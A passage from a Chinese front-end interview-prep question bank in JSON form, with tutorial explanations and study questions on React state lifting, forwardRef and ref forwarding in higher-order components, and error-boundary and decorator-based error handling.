这样的组件，选择在子组件中声明状态而不是在父组件中声明状态，将能够使代码更易于阅读。使用这种方法，你不必在每个父组件中声明状态。\n\n通常对应用程序中的大多数组件来说，这是不必要的。但是，对于某些类型的组件，特别是可重用组件，会有这种需求。下面描述一下最通用的场景。\n\n**多说无用，上代码：**\n\n![image.png](https://static.ecool.fun//article/da368d83-a8ff-4125-ab19-a71b7b02cd5d.awebp)\n\n例如，我们有一个常见的 Modal 组件，我们想要在 Modal 中保留可见性状态。当一些组件想要使用这个 Modal 时，通常会定义自己的可见状态，但是通过 State Lifting，这个步骤将不再必要。\n\n在 上面的 Modal 组件中，做了如下操作：\n\n1.  首先，使用forwardRef执行 ref 转发，ref 转发是一种自动将 ref 通过组件传递给子组件的技术。\n2.  使用 useState 声明状态以控制Modal组件的展示或隐藏。\n3.  使用 React 内置的 `useImperativeHandle` hook 将属性或者方法暴露出去，这里我们添加了一些数据和函数供父组件使用。现在父组件可以直接调用子组件的`show`、`hide`、`isVisble`这些方法和属性。\n\n![image.png](https://static.ecool.fun//article/8c52769e-2a6d-4fe1-a60b-f9acc9793ea9.awebp)\n\n那么现在我们想在父组件中使用 Modal 组件，要如何使用 Modal 中的状态呢？\n\n1.  首先使用`createRef`方法创建一个 ref 对象，并将其传递给 Modal 子组件\n2.  使用 `ref.current` 就可以拿到子组件的isVisble属性以及 show 、 hide 方法\n\n使用起来的确很简单。\n\n## 总结\n\n状态提升对某些类型的组件会非常有用，特别是对于可重用组件。但是如果你是在所有组件中使用状态提升，将会提升代码的复杂度。\n\n> 所以，谨慎使用！",
    "testPoint": "### React状态提升基础\n\n1. **状态提升的概念**：\n   - 请解释什么是React中的状态提升，以及它为何重要。\n   - 在什么情况下，你会考虑使用状态提升？\n\n2. **状态提升的应用场景**：\n   - 能否给出一个实际项目中需要状态提升的示例？\n   - 在这个示例中，为什么状态提升是合适的解决方案？\n\n### React状态提升的实践\n\n1. **确定状态位置**：\n   - 如何确定应该将状态提升到哪个组件层级？\n   - 在提升状态时，有哪些因素需要考虑？\n\n2. **状态提升的实现**：\n   - 请描述一个实现状态提升的具体步骤。\n   - 在提升状态后，如何确保组件之间的状态传递和更新是正确的？\n\n3. **避免过度提升**：\n   - 什么是过度提升，它会导致什么问题？\n   - 如何避免在React应用中过度提升状态？\n\n",
    "exerciseKeyList": "[]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T10:00:44.000Z",
    "updateAt": "2025-03-20T01:35:03.000Z",
    "$progressExercise": "",
    "$exerciseList": []
  },
  "208": {
    "id": 208,
    "tagId": 13,
    "title": "forwardRef 该怎么用？",
    "explanation": "## React.forwardRef\n\n对于ref转发，官网是这样描述的\n\n> Ref 转发是一项将 [ref](https://react.docschina.org/docs/refs-and-the-dom.html \"https://react.docschina.org/docs/refs-and-the-dom.html\") 自动地通过组件传递到其一子组件的技巧。对于大多数应用中的组件来说，这通常不是必需的。但其对某些组件，尤其是可重用的组件库是很有用的。\n\n想详细了解的可以去看官方文档 [Refs 转发 – React (docschina.org)](https://react.docschina.org/docs/forwarding-refs.html#forwarding-refs-in-higher-order-components \"https://react.docschina.org/docs/forwarding-refs.html#forwarding-refs-in-higher-order-components\")\n\n现在让我们直奔主题吧！\n\n`React.forwardRef(render)`的返回值是`react`组件，接收的参数是一个 `render`函数，函数签名为`render(props, ref)`，第二个参数将其接受的 [ref](https://react.docschina.org/docs/refs-and-the-dom.html \"https://react.docschina.org/docs/refs-and-the-dom.html\") 属性**转发**到`render`返回的组件中。\n\n这项技术并不常见，但在以下两种场景中特别有用:\n\n-   转发 `ref` 到组件内部的`DOM` 节点上\n-   在高阶组件中转发`ref`\n\n## 转发 `ref`到组件内部的`DOM`节点\n\n比如我们想要将一个组件内部的某个元素暴露出去, 就可以这么做\n\n```jsx\n// App.js\nimport React from 'react';\nimport Foo from './component/Foo';\n\nexport default class App extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {};\n    this.input = React.createRef(); // 1\n      // ↑5\n  }\n  \n  handleClick = (e) => {\n    const input = this.input.current;\n      // 6\n    console.log(input);\n    console.log(input.value);\n    input.focus();\n  }\n  \n  render() {\n    return (\n      <>\n        <button onClick={this.handleClick}>click to get value</button>\n                  {/*2*/}\n        <Foo ref={this.input}/>\n      </>\n    )\n  }\n}\n```\n\n```jsx\n// Foo.jsx\nimport React from 'react';\n\t\t\t             // 3\nconst Foo = React.forwardRef((props, myRef) => {\n  return (\n    <div>\n      <p>....一些其他节点</p>\t\t\t\t\t\t\t\t{/*4*/}\n      <input type=\"text\" defaultValue='ref 成功转发到 Foo 组件内部的 input节点上' ref={myRef}/>\n      <p>....一些其他节点</p>\n      <p>....一些其他节点</p>\n    </div>\n  );\n});\n\nexport default Foo;\n\n```\n\n仔细看代码中标记的数字，这是`ref`转发的流程:\n\n1.  创建了一个`ref`\n2.  将其挂载到 组件上这个组件是通过`React.forwardRef`创建出来的, 注意这里很关键，后面细说\n3.  组件`Foo`接收到了一个`ref`，于是将它转发到`DOM`节点`input`上\n4.  `ref`如愿的挂载到内部节点`input`上\n5.  现在`this.input.current`保存着对节点`input`的引用\n6.  点击按钮, 现在可以很轻松的获取`Foo`内部节点的`value`以及获取其焦点\n\n![image-20210715133621474.png](https://static.ecool.fun//article/efff3087-67c0-46cf-b3ce-48188cc8c4af.awebp)\n\n## 细节补充\n\n之前说过，步骤2很关键，这是因为 `ref` 的值根据节点的类型而有所不同：\n\n1.  当 `ref` 属性用于 HTML 元素时，接收底层 DOM 元素作为其 `current` 属性。\n    \n2.  当 `ref` 属性用于自定义 class 组件时，`ref` 接收组件实例作为其 `current` 属性。\n    \n3.  **不能在函数组件上使用 `ref` 属性**，因为他们没有实例。\n    \n\n第一个很好理解，我们上面的例子已经体现了这一点, `ref` 最终被挂载到了 `input` 节点上, `input`是一个`HTML`元素，所以`current`中保留的是`DOM`元素。\n\n对于第二个，我们现在用另一个组件来演示\n\n```jsx\n// Bar.jsx\nimport React from 'react';\n\nexport default class Bar extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      message: '这是class组件, ref 只能挂载到实例上'\n    };\n  }\n  \n  componentDidMount() {\n    console.log(this);\n  }\n  render() {\n    return (\n      <div>\n        class 组件\n      </div>\n    );\n  }\n}\n```\n\n```jsx\n// App.js\nimport React from 'react';\nimport Bar from './component/Bar'\n\nexport default class App extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {};\n    this.myRef = React.createRef(); // 创建 ref\n  }\n  \n  handleClick = (e) => {\n    const instance = this.myRef.current;\n    // 打印的是 Bar 实例\n    console.log(instance);\n  }\n  render() {\n    return (\n      <div>\n        <button onClick={this.handleClick}>click to get instance</button>\n        {/*挂载到组件上，因为Bar是一个class组件，所以只能挂载到其实例上*/}\n        <Bar ref={this.myRef} />\n      </div>\n    );\n  }\n}\n```\n\n第一条打印是 Bar 组件挂载后生命周期函数打印的\n\n第二条打印是点击按钮后打印的，证明确实只是挂载到了组件实例上。后面的高阶组件中还会出现类似的问题。\n\n![image-20210715134441071.png](https://static.ecool.fun//article/6592763b-4e50-455e-b8f0-82e7498fc240.awebp)\n\n对于第三个，不能在函数组件上使用 `ref` 属性，因为他们没有实例\n\n```jsx\n// Baz.jsx\nimport React from 'react';\n\nconst Baz = (props) => {\n  return (\n    <div>\n      啊？\n    </div>\n  );\n};\n\nexport default Baz;\n\n```\n\n```jsx\n// App.js 中, 省略掉了其他代码\n\n<Baz ref={this.myRef} />\n```\n\n这时就会报错了, 意思是不能在函数式组件上使用 `ref`, 尝试访问 `ref`会失败。\n\n![image-20210715135235910.png](https://static.ecool.fun//article/faf6cfcb-226f-4bb9-84f2-3581d4657bfd.awebp)\n\n一般函数式组件都是用`React.forwardRef`包装一下然后返回出去的, 函数式组件本来就是一个`render`函数，不过在被`React.forwardRef`包装后就多了一个`ref`属性了。\n\n```jsx\n// 将我们的函数式组件改造成这个样子.\nconst Baz = React.forwardRef((props, ref) => {\n  return (\n    <div>\n      啊？\n    </div>\n  );\n})\n```\n\n此时的`ref`还没有被挂载，所以访问`ref.current`会得到`null`，不过总算不会报错了\n\n![image-20210715140135383.png](https://static.ecool.fun//article/9a50035c-7c44-4295-b51d-dcbe15ea80c5.awebp)\n\n函数式组件只是将`ref`传递下去，`ref`最终只能被挂载到内部的某个**class组件或者HTML元素**上\n\n还有一点要说明一下，不能在函数组件上使用 `ref` 属性并不是不能在函数式组件内部使用 `ref`\n\n如下所示：\n\n```jsx\n// 还是 Baz.jsx\nimport React from 'react';\nconst myRef = React.createRef();\n\nconst Baz = (props) => {\n  function handleClick(e) {\n    const input = myRef.current;\n    console.log(input.value);\n  }\n  return (\n    <div>\n      <button onClick={handleClick}>click to get value</button>\n      <input ref={myRef} type=\"text\" defaultValue={'不能在函数组件上使用 ref 属性并不代表着不能在函数式组件内部使用 `ref`'}/>\n    </div>\n  );\n}\n\nexport default Baz;\n\n```\n\n![image-20210715141214954.png](https://static.ecool.fun//article/b1c7eaa5-6d7a-43ab-8dbc-2b8713fcc64f.awebp)\n\n## 在高阶组件中转发`ref`\n\n依然使用 之前的 Bar.jsx\n\n```jsx\n// Bar.jsx\nimport React from 'react';\n\nexport default class Bar extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      message: '这是Bar.jsx'\n    };\n  }\n  \n  componentDidMount() {\n    console.log(this);\n  }\n  render() {\n    return (\n      <div>\n        class 组件\n      </div>\n    );\n  }\n}\n```\n\n我们使用高阶组件，为`Bar`组件增加一个功能：每次`props`改变都打印其变化\n\n```jsx\n// logProps.js\nfunction logProps(WrappedComponent) {\n    \n  class LogProps extends React.Component {\n    componentDidUpdate(prevProps) {\n      console.log('Previous props: ', prevProps);\n      console.log('Current props: ', this.props);\n    }\n    render() {\n        // 高阶组件透传所有的 props 到其包裹的组件，所以渲染结果将是相同的\n      return <WrappedComponent {...this.props} />;\n    }\n  }\n  return LogProps;\n}\n```\n\n但是高阶组件 **不! 会! 传! 递!** `ref`, 这是因为 `ref` 不是 `prop`属性。就像 `key` 一样，其被 React 进行了特殊处理。\n\n如果你对**被高阶组件包装后的组件**添加 `ref`，该 `ref` 将引用最外层的容器组件，而不是被包裹的组件。\n\n对于上面的例子，如果用了`ref`, 那么最终会挂载到 `<LogProps/>`组件上，而不是传入的被包裹的 `<WrappedComponent/>`组件上。\n\n> 其实这很好理解，自己在脑袋里模拟一下数据流就知道 ref 最后会被挂载到最外面的组件上，不过高阶组件中的这个透传的概念很容易将人带偏，误以为 ref 会跟着 props 一起透传下去， 其实是不会传递的。\n\n为了更好的在控制台观察究竟是挂载到哪个组件上，我们为这两个组件添加 `state`\n\n```jsx\n// Bar.jsx 中\nthis.state = {\n  message: '这是Bar.jsx'\n}\n\n// logProps.js 中返回的 LogProps组件\nthis.state = {\n  message: '这是LogProps'\n}\n```\n\n```jsx\n// App.js\nimport React from 'react';\nimport logProps from './component/logProps';\nimport Bar from './component/Bar'\n\nconst BarWithLogProps = logProps(Bar);\nexport default class App extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      name: 'Roman',\n      age: 23,\n      hobby: 'video game'\n    }\n    this.myRef = React.createRef();\n  }\n  handleClick = (e) => {\n    this.setState({\n      name: 'fxy',\n      age: 32,\n      hobby: 'swim'\n    });\n    console.log(this.myRef.current);\n  }\n  render() {\n    return (\n      <div>\n        <button onClick={this.handleClick} >click to change props</button>\n        <BarWithLogProps {...this.state} ref={this.myRef} />\n      </div>\n    );\n  }\n}\n```\n\n我们点击按钮，在控制台可以清楚的看到， `ref`确实是被挂载到外部组件 `LogProps`上。\n\n![image-20210715151515685.png](https://static.ecool.fun//article/3925395c-5e83-45df-8f98-43740f7855aa.awebp)\n\n`React.forwardRef`再次登场，我们可以使用 `React.forwardRef` API 明确地将 `ref` 转发到内部的 `<WrappedComponent/>` 组件\n\n最后我们将 `logProps.js`改造成这样\n\n```jsx\n// 最终形态\nimport React from 'react';\n\nexport default function logProps(WrappedComponent) {\n  \n  class LogProps extends React.Component {\n    // 2\n    constructor(props) {\n      super(props);\n      this.state = {\n        message: '这是LogProps'\n      }\n    }\n    componentDidUpdate(prevProps) {\n      console.log('Previous props: ', prevProps);\n      console.log('Current props: ', this.props);\n    }\n    render() {\n      // 3\n      const {customRef, ...props} = this.props;\n      // 3.5 return <WrappedComponent {...this.props}/>;\n      return <WrappedComponent {...props} ref={customRef} />;\n    }\n  }\n  // return LogProps;\n  return React.forwardRef((props, ref) => (\n    // 1\n    <LogProps {...props} customRef={ref} />\n  ))\n  \n}\n```\n\n1.  我们将 `LogProps`组件作为`render`函数的返回值，这样渲染结果还是不变，然后将传入的`ref`转发到 `LogProps`组件的自定义属性 `customRef`上。注意这里**一定要转发到自定义属性**，如果转发到 `ref`属性上最终还是会被挂载到 `LogProps`上，等于转了一圈又回到了原地...\n2.  所有的属性都被传递到`props`中\n3.  将 `props`中的 `customRef`提取出来，最终传递到`WrappedComponent`的`ref`属性上。\n\n最后`ref`被成功转发到被包裹的组件`WrappedComponent`上。\n\n点击按钮，现在来控制台看看\n\n![image-20210715154514906.png](https://static.ecool.fun//article/fe7ffc6d-617b-4e47-a770-39ad885f521d.awebp) ref 被成功的挂载到目标组件上。\n\n细心的读者可能已经发现`logProps.js`转发`ref`还有另一种写法, 就是 3.5 那样，不用抽离 `customRef`，仍然将 `customRef` 作为`props` 透传下去, 不过这样就会导致一个问题： `customRef`作为 `props`传递，进入了 `WrappedComponent`组件内部，此时 `customRef`还没有作为`ref`属性挂载到任何 `class组件`或者 `DOM节点`上。\n\n如果这时访问`ref.current`会得到`null`\n\n![image-20210715160350304.png](https://static.ecool.fun//article/9ea10434-cad9-45c1-82c9-4c9c7aed6497.awebp)\n\n不过这也更方便的让我们**转发`ref`到组件内部的`DOM`节点**\n\n```jsx\n// Bar.jsx\nrender() {\n  return (\n    <div ref={this.props.customRef}>\n      name: {this.props.name}\n      <br/>\n      age: {this.props.age}\n      <br/>\n      hobby: {this.props.hobby}\n    </div>\n  );\n}\n```\n\n![image-20210715160553235.png](https://static.ecool.fun//article/8eafad48-6b26-44e8-94f9-6db45ea5f01a.awebp)\n\n其实用最开始的写法让`customRef`作为`ref`属性挂载到组件上，在组件内部使用 `React.forwardRef`一样能将`ref`转发到组件内部的`DOM`节点上。",
    "testPoint": "## **1. `forwardRef` 的基本概念**\n- **考察点**：\n  - `forwardRef` 的作用及使用场景。\n  - 为什么需要 `forwardRef`，它解决了什么问题？\n\n- **问题示例**：\n  - `forwardRef` 是什么？它的主要作用是什么？\n  - 为什么 React 需要 `forwardRef`，在什么场景下会使用它？\n  - `forwardRef` 和 `useRef` 有什么区别？\n  - `forwardRef` 的第二个参数 `ref` 是如何工作的？\n\n---\n\n## **2. `forwardRef` 的基本用法**\n- **考察点**：\n  - 如何正确使用 `forwardRef`，将 `ref` 传递给子组件。\n  - `forwardRef` 适用于函数组件，而类组件不需要它。\n\n- **问题示例**：\n  - 如何使用 `forwardRef` 将 `ref` 透传给子组件？\n  - `forwardRef` 只能用于函数组件吗？如果要在类组件中使用 `ref`，该怎么办？\n  - 请写一个使用 `forwardRef` 传递 `ref` 到 `input` 元素的示例。\n\n---\n\n## **3. `forwardRef` 与 DOM 交互**\n- **考察点**：\n  - 如何使用 `forwardRef` 操作原生 DOM？\n  - 如何在 `forwardRef` 组件中访问子组件的 `ref`？\n\n- **问题示例**：\n  - 如何使用 `forwardRef` 让父组件能够获取子组件的 DOM 节点？\n  - `forwardRef` 是否可以用于自定义的 React 组件，而不仅仅是 HTML 元素？\n  - 在 `forwardRef` 组件中，`useImperativeHandle` 有什么作用？\n\n---\n\n## **4. `forwardRef` 与高阶组件（HOC）**\n- **考察点**：\n  - `forwardRef` 解决了高阶组件（HOC）不能正确传递 `ref` 的问题。\n  - 如何在高阶组件中使用 `forwardRef`？\n\n- **问题示例**：\n  - 为什么 `forwardRef` 适用于高阶组件（HOC）？\n  - `forwardRef` 如何解决高阶组件 `ref` 透传的问题？\n  - 你如何在 HOC 内部正确使用 `forwardRef`？\n\n---\n\n## **5. `forwardRef` 与 `useImperativeHandle` 结合**\n- **考察点**：\n  - `useImperativeHandle` 用于自定义 `ref` 的暴露内容。\n  - `forwardRef` 与 `useImperativeHandle` 组合的使用方式。\n\n- **问题示例**：\n  - `useImperativeHandle` 的作用是什么？为什么要与 `forwardRef` 结合使用？\n  - 如何使用 `useImperativeHandle` 让 `ref` 只暴露部分方法，而不是整个 DOM？\n  - 请写一个 `forwardRef` + `useImperativeHandle` 结合的示例，实现一个 `ref` 只暴露 `focus` 方法的 `input` 组件。\n\n---\n\n## **6. `forwardRef` 的局限性与注意事项**\n- **考察点**：\n  - `forwardRef` 不能用于 `props.children` 直接传递 `ref`。\n  - `forwardRef` 不能直接用于 React 组件的默认 `ref` 绑定。\n\n- **问题示例**：\n  - `forwardRef` 是否可以用于 `props.children`？为什么不行？\n  - `forwardRef` 是否可以用于 Fragment（`<>...</>`）？为什么？\n  - `forwardRef` 传递 `ref` 给多个子组件时应该如何处理？\n\n---\n\n## **7. `forwardRef` 与 TypeScript**\n- **考察点**：\n  - `forwardRef` 如何在 TypeScript 中正确使用？\n  - 如何为 `forwardRef` 组件定义正确的 `ref` 类型？\n\n- **问题示例**：\n  - 在 TypeScript 中，如何为 `forwardRef` 组件定义 `ref` 的类型？\n  - `forwardRef` 组件的 `ref` 类型与 `props` 类型如何结合？\n  - 如何在 TypeScript 中使用 `forwardRef` 让 `ref` 指向一个 `input` 元素？\n\n---\n\n## **8. `forwardRef` 在实际项目中的应用**\n- **考察点**：\n  - 真实业务场景中的 `forwardRef` 使用，如封装 UI 组件库。\n  - `forwardRef` 适用于哪些 UI 组件（如 `Button`、`Input`、`Modal`）？\n\n- **问题示例**：\n  - 在设计一个 `Button` 组件时，为什么要使用 `forwardRef`？\n  - `forwardRef` 在 `Modal` 组件中可以用于哪些场景？\n  - `forwardRef` 在封装 Ant Design 或 Material-UI 组件时的作用是什么？",
    "exerciseKeyList": "[\"fbe1ba95-3c26-4d09-b65d-c2dda661b280\",\"3cd5964c-8b82-4bba-9ce2-116c2707b83f\",\"22a212d3-d12b-4f23-a7d7-26a55037af7d\",\"32135204-0c1c-459c-977b-d12895bd5a70\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T10:05:16.000Z",
    "updateAt": "2025-03-20T01:39:14.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "32135204-0c1c-459c-977b-d12895bd5a70",
        "title": "React 中的 ref 有什么用？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:12:41.000Z",
        "updateAt": "2024-08-10T17:05:03.000Z"
      },
      {
        "exerciseKey": "3cd5964c-8b82-4bba-9ce2-116c2707b83f",
        "title": "forwardRef 作用是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T18:43:15.000Z"
      },
      {
        "exerciseKey": "fbe1ba95-3c26-4d09-b65d-c2dda661b280",
        "title": "React中，useRef、ref、forwardsRef 的区别是什么?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T23:24:19.000Z"
      }
    ]
  },
  "209": {
    "id": 209,
    "tagId": 13,
    "title": "错误边界",
    "explanation": "人无完人，代码总会出错，出错并不可怕，关键是怎么处理。  \n\n我就想问问大家react的应用的错误怎么捕捉呢？ 这个时候：\n\n-   小白+++：怎么处理？\n-   小白++： ErrorBoundary\n-   小白+： ErrorBoundary, try catch\n-   小黑#: ErrorBoundary, try catch, window.onerror\n-   小黑##: 这个是个严肃的问题，我知道N种处理方式，你有什么更好的方案?\n\n## ErrorBoundary\n\nEerrorBoundary是16版本出来的，有人问那我的15版本呢，我不听我不听，反正我用16，当然15有`unstable_handleError`。\n\n关于ErrorBoundary官网介绍比较详细，这个不是重点，重点是他能捕捉哪些异常。\n\n-   子组件的渲染\n-   生命周期函数\n-   构造函数\n\n```js\nclass ErrorBoundary extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { hasError: false };\n  }\n\n  componentDidCatch(error, info) {\n    // Display fallback UI\n    this.setState({ hasError: true });\n    // You can also log the error to an error reporting service\n    logErrorToMyService(error, info);\n  }\n\n  render() {\n    if (this.state.hasError) {\n      // You can render any custom fallback UI\n      return <h1>Something went wrong.</h1>;\n    }\n    return this.props.children;\n  }\n}\n\n\n<ErrorBoundary>\n  <MyWidget />\n</ErrorBoundary>\n```\n\n开源世界就是好，早有大神封装了[react-error-boundary](https://www.npmjs.com/package/react-error-boundary \"https://www.npmjs.com/package/react-error-boundary\") 这种优秀的库。  \n你只需要关心出现错误后需要关心什么，还以来个 `Reset`, 完美。\n\n```js\nimport {ErrorBoundary} from 'react-error-boundary'\n\nfunction ErrorFallback({error, resetErrorBoundary}) {\n  return (\n    <div role=\"alert\">\n      <p>Something went wrong:</p>\n      <pre>{error.message}</pre>\n      <button onClick={resetErrorBoundary}>Try again</button>\n    </div>\n  )\n}\n\nconst ui = (\n  <ErrorBoundary\n    FallbackComponent={ErrorFallback}\n    onReset={() => {\n      // reset the state of your app so the error doesn't happen again\n    }}\n  >\n    <ComponentThatMayError />\n  </ErrorBoundary>\n)\n```\n\n遗憾的是，error boundaries并不会捕捉这些错误：\n\n-   事件处理程序\n-   异步代码 (e.g. setTimeout or requestAnimationFrame callbacks)\n-   服务端的渲染代码\n-   error boundaries自己抛出的错误\n\n原文可见参见官网[introducing-error-boundaries](https://reactjs.org/docs/error-boundaries.html#introducing-error-boundaries \"https://reactjs.org/docs/error-boundaries.html#introducing-error-boundaries\")\n\n本文要捕获的就是 事件处理程序的错误。  \n官方其实也是有方案的[how-about-event-handlers](https://reactjs.org/docs/error-boundaries.html#how-about-event-handlers \"https://reactjs.org/docs/error-boundaries.html#how-about-event-handlers\")， 就是 try catch.  \n但是，那么多事件处理程序，我的天，得写多少，。。。。。。。。。。。。。。。。。。。。\n\n```js\n  handleClick() {\n    try {\n      // Do something that could throw\n    } catch (error) {\n      this.setState({ error });\n    }\n  }\n```\n\n## Error Boundary 之外\n\n我们先看看一张表格，罗列了我们能捕获异常的手段和范围。\n\n| 异常类型 | 同步方法 | 异步方法 | 资源加载 | Promise | async/await |\n| --- | :-: | :-: | :-: | :-: | :-: |\n| try/catch | √ |  |  |  | √ |\n| window.onerror | √ | √ |  |  |  |\n| error | √ | √ | √ |  |  |\n| unhandledrejection |  |  |  | √ | √ |\n\n### try/catch\n\n可以捕获同步和async/await的异常。\n\n### window.onerror , error事件\n\n```js\n    window.addEventListener('error', this.onError, true);\n    window.onerror = this.onError\n```\n\n`window.addEventListener('error')` 这种可以比 `window.onerror` 多捕获资源记载异常. 请注意最后一个参数是 `true`, `false`的话可能就不如你期望。\n\n当然你如果问题这第三个参数的含义，我就有点不想理你了。拜。\n\n### unhandledrejection\n\n请注意最后一个参数是 `true`。\n\n```js\nwindow.removeEventListener('unhandledrejection', this.onReject, true)\n```\n\n其捕获未被捕获的Promise的异常。\n\n### XMLHttpRequest 与 fetch\n\n`XMLHttpRequest` 很好处理，自己有onerror事件。 当然你99.99%也不会自己基于`XMLHttpRequest`封装一个库， `axios` 真香，有这完毕的错误处理机制。\n\n至于`fetch`, 自己带着catch跑，不处理就是你自己的问题了。\n\n这么多，太难了。  \n还好，其实有一个库 [react-error-catch](https://www.npmjs.com/package/react-error-catch \"https://www.npmjs.com/package/react-error-catch\") 是基于ErrorBoudary,error与unhandledrejection封装的一个组件。\n\n其核心如下\n\n```js\n   ErrorBoundary.prototype.componentDidMount = function () {\n        // event catch\n        window.addEventListener('error', this.catchError, true);\n        // async code\n        window.addEventListener('unhandledrejection', this.catchRejectEvent, true);\n    };\n```\n\n使用：\n\n```js\nimport ErrorCatch from 'react-error-catch'\n\nconst App = () => {\n  return (\n  <ErrorCatch\n      app=\"react-catch\"\n      user=\"cxyuns\"\n      delay={5000}\n      max={1}\n      filters={[]}\n      onCatch={(errors) => {\n        console.log('报错咯');\n        // 上报异常信息到后端，动态创建标签方式\n        new Image().src = `http://localhost:3000/log/report?info=${JSON.stringify(errors)}`\n      }}\n    >\n      <Main />\n    </ErrorCatch>)\n}\n\nexport default \n```\n\n鼓掌，鼓掌。\n\n其实不然： 利用error捕获的错误，其最主要的是提供了错误堆栈信息，对于分析错误相当不友好，尤其打包之后。\n\n错误那么多，我就先好好处理React里面的事件处理程序。  \n至于其他，待续。\n\n## 事件处理程序的异常捕获\n\n### 示例\n\n我的思路原理很简单，使用[decorator](http://es6.ruanyifeng.com/#docs/decorator \"http://es6.ruanyifeng.com/#docs/decorator\")来重写原来的方法。\n\n先看一下使用：\n\n```js\n\n   @methodCatch({ message: \"创建订单失败\", toast: true, report:true, log:true })\n    async createOrder() {\n        const data = {...};\n        const res = await createOrder();\n        if (!res || res.errCode !== 0) {\n            return Toast.error(\"创建订单失败\");\n        }\n        \n        .......\n        其他可能产生异常的代码\n        .......\n        \n       Toast.success(\"创建订单成功\");\n    }\n```\n\n注意四个参数：\n\n-   message： 出现错误时，打印的错误\n-   toast： 出现错误，是否Toast\n-   report: 出现错误，是否上报\n-   log: 使用使用console.error打印\n\n可能你说，这这，消息定死，不合理啊。我要是有其他消息呢。  \n此时我微微一笑别急， 再看一段代码\n\n```js\n  @methodCatch({ message: \"创建订单失败\", toast: true, report:true, log:true })\n    async createOrder() {\n        const data = {...};\n        const res = await createOrder();\n        if (!res || res.errCode !== 0) {\n            return Toast.error(\"创建订单失败\");\n        }\n       \n        .......\n        其他可能产生异常的代码\n        .......\n        \n       throw new CatchError(\"创建订单失败了，请联系管理员\", {\n           toast: true,\n           report: true,\n           log: false\n       })\n       \n       Toast.success(\"创建订单成功\");\n\n    }\n```\n\n是都，没错，你可以通过抛出 自定义的`CatchError`来覆盖之前的默认选项。\n\n这个`methodCatch`可以捕获，同步和异步的错误，我们来一起看看全部的代码。\n\n### 类型定义\n\n```typescript\nexport interface CatchOptions {\n    report?: boolean;\n    message?: string;\n    log?: boolean;\n    toast?: boolean;\n}\n\n// 这里写到 const.ts更合理\nexport const DEFAULT_ERROR_CATCH_OPTIONS: CatchOptions = {\n    report: true,\n    message: \"未知异常\",\n    log: true,\n    toast: false\n}\n```\n\n### 自定义的CatchError\n\n```typescript\nimport { CatchOptions, DEFAULT_ERROR_CATCH_OPTIONS } from \"@typess/errorCatch\";\n\nexport class CatchError extends Error {\n\n    public __type__ = \"__CATCH_ERROR__\";\n    /**\n     * 捕捉到的错误\n     * @param message 消息\n     * @options 其他参数\n     */\n    constructor(message: string, public options: CatchOptions = DEFAULT_ERROR_CATCH_OPTIONS) {\n        super(message);\n    }\n}\n\n```\n\n### 装饰器\n\n```typescript\nimport Toast from \"@components/Toast\";\nimport { CatchOptions, DEFAULT_ERROR_CATCH_OPTIONS } from \"@typess/errorCatch\";\nimport { CatchError } from \"@util/error/CatchError\";\n\n\nconst W_TYPES = [\"string\", \"object\"];\nexport function methodCatch(options: string | CatchOptions = DEFAULT_ERROR_CATCH_OPTIONS) {\n\n    const type = typeof options;\n\n    let opt: CatchOptions;\n\n    \n    if (options == null || !W_TYPES.includes(type)) { // null 或者 不是字符串或者对象\n        opt = DEFAULT_ERROR_CATCH_OPTIONS;\n    } else if (typeof options === \"string\") {  // 字符串\n        opt = {\n            ...DEFAULT_ERROR_CATCH_OPTIONS,\n            message: options || DEFAULT_ERROR_CATCH_OPTIONS.message,\n        }\n    } else { // 有效的对象\n        opt = { ...DEFAULT_ERROR_CATCH_OPTIONS, ...options }\n    }\n\n    return function (_target: any, _name: string, descriptor: PropertyDescriptor): any {\n\n        const oldFn = descriptor.value;\n\n        Object.defineProperty(descriptor, \"value\", {\n            get() {\n                async function proxy(...args: any[]) {\n                    try {\n                        const res = await oldFn.apply(this, args);\n                        return res;\n                    } catch (err) {\n                        // if (err instanceof CatchError) {\n                        if(err.__type__ == \"__CATCH_ERROR__\"){\n                            err = err as CatchError;\n                            const mOpt = { ...opt, ...(err.options || {}) };\n\n                            if (mOpt.log) {\n                                console.error(\"asyncMethodCatch:\", mOpt.message || err.message , err);\n                            }\n\n                            if (mOpt.report) {\n                                // TODO::\n                            }\n\n                            if (mOpt.toast) {\n                                Toast.error(mOpt.message);\n                            }\n\n                        } else {\n                            \n                            const message = err.message || opt.message;\n                            console.error(\"asyncMethodCatch:\", message, err);\n\n                            if (opt.toast) {\n                                Toast.error(message);\n                            }\n                        }\n                    }\n                }\n                proxy._bound = true;\n                return proxy;\n            }\n        })\n        return descriptor;\n    }\n}\n```\n\n## 总结一下\n\n1.  利用装饰器重写原方法，达到捕获错误的目的\n2.  自定义错误类，抛出它，就能达到覆盖默认选项的目的。增加了灵活性。\n\n```js\n  @methodCatch({ message: \"创建订单失败\", toast: true, report:true, log:true })\n    async createOrder() {\n        const data = {...};\n        const res = await createOrder();\n        if (!res || res.errCode !== 0) {\n            return Toast.error(\"创建订单失败\");\n        }\n       Toast.success(\"创建订单成功\");\n       \n        .......\n        其他可能产生异常的代码\n        .......\n        \n       throw new CatchError(\"创建订单失败了，请联系管理员\", {\n           toast: true,\n           report: true,\n           log: false\n       })\n    }\n```\n\n## 下一步\n\n啥下一步，走一步看一步啦。\n\n不，接下来的路，还很长。 这才是一个基础版本。\n\n1.  扩大成果，支持更多类型，以及hooks版本。\n\n```typescript\n\n@XXXCatch\nclasss AAA{\n    @YYYCatch\n    method = ()=> {\n    }\n}\n```\n\n2.  抽象，再抽象，再抽象\n\n玩笑开完了，严肃一下：\n\n**当前方案存在的问题:**\n\n1.  功能局限\n2.  抽象不够  \n    获取选项,代理函数, 